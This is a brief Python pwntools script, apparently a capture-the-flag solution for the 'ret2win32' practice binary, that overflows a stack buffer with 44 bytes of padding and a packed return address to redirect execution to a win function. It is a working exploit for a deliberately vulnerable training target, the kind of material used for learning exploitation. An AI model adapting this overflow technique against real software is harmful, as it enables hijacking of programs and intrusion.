from pwn import *

p = process("./ret2win32")

ret2win = 0x08048659

payload = ''
payload += "A"*44
payload += p32(ret2win)

p.sendline(payload)
p.interactive()
